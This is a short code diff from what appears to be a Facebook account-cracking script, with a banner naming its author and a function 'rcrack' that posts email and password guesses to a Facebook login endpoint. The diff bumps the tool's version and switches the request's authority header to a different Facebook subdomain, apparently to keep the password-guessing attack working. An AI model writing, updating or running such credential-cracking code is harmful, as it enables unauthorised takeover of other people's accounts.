@@ -135,7 +135,7 @@ logo=("""
 →   Facebook   : Raziqullah Saadat
 →   Github     : Raziq
 →   Tools       :  RANDOM 
-\x1b[1;97m→   Version    :  0.3
+\x1b[1;97m→   Version    :  0.4
 4G/3G full speed internet 💔Update Coming Soon
 \33[1;37m----------------------------------------------""")
 
@@ -425,7 +425,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'x.facebook.com',
+            header_freefb = {'authority': 'm.alpha.facebook.com',
             'method':'GET',
             'path':'/?tbua=1',
             'scheme':'https',
